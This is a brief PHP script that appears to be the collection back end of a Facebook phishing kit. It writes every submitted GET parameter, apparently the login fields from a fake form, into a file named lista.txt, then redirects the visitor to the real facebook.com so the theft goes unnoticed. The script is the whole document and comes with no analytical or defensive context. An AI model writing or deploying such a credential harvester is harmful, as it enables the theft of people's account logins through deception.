<?php
Header("Location: http://www.facebook.com");

$handle = fopen("lista.txt", "a");

foreach($_GET as $variable => $value) {

fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}fwrite($handle, "\r\n");

fclose($handle);
exit;
?>